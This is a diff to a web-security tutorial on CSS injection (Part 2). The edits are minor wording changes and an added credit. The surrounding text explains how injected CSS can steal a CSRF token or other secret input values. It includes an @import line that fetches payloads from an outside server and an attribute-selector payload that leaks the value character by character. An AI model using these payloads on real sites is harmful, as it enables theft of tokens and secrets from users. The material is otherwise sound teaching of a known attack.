@@ -2,7 +2,7 @@
 sidebar_position: 18
 ---
 
-# CSS Injection: Attacking with CSS Alone (Part 2)
+# CSS Injection: Attacking with Just CSS (Part 2)
 
 In the previous post, we learned about the basic principles of CSS data theft and demonstrated it using HackMD as a practical example, successfully stealing the CSRF token. In this post, we will delve into some details of CSS injection and address the following questions:
 
@@ -40,7 +40,7 @@ Then, the server responds with the following style:
 @import url(https://myserver.com/payload?len=8)
 ```
 
-Here's the key: although we import 8 at once, "the server will hang for the next 7 requests and not provide a response." Only the first URL `https://myserver.com/payload?len=1` will return a response, which contains the previously mentioned data theft payload:
+Here's the key: although we import 8 at once, the server will hang for the next 7 requests and not provide a response. Only the first URL `https://myserver.com/payload?len=1` will return a response, which contains the previously mentioned data theft payload:
 
 ``` css
 input[name="secret"][value^="a"] {
@@ -392,7 +392,7 @@ Once we know the first character, we can increase the width of the div, for exam
 
 From the above process, we can see that the server will receive three requests in the order of A, C, B, which represents the order of the characters on the screen. Changing the width and font-family continuously can be achieved using CSS animation.
 
-If you want to see the complete demo, you can visit this webpage (source: [What can we do with single CSS injection?](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/)): https://demo.vwzq.net/css2.html
+This complex but brilliant way is not invented by me, is by @cgvwzq and @terjanq. If you want to see the original demo, you can visit this webpage (source: [What can we do with single CSS injection?](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/)): https://demo.vwzq.net/css2.html
 
 Although this solution solves the problem of "not knowing the order of characters", it still cannot solve the problem of duplicate characters, because duplicate characters will not trigger new requests.
 
